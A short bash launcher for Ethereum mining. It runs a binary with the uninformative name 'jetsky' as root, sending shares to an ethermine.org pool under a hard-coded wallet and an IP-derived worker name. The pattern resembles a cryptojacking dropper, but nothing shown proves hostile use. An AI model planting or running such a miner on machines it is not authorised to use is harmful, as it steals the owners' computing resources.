#!/bin/bash

WALLET=0x1a2Ae59743eE7873D3145EbA4FDc686A9455E6c0
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-eth

cd "$(dirname "$0")"

chmod +x ./jetsky && sudo ./jetsky -G -P stratum1+tcp://$WALLET.$WORKER@asia1.ethermine.org:4444
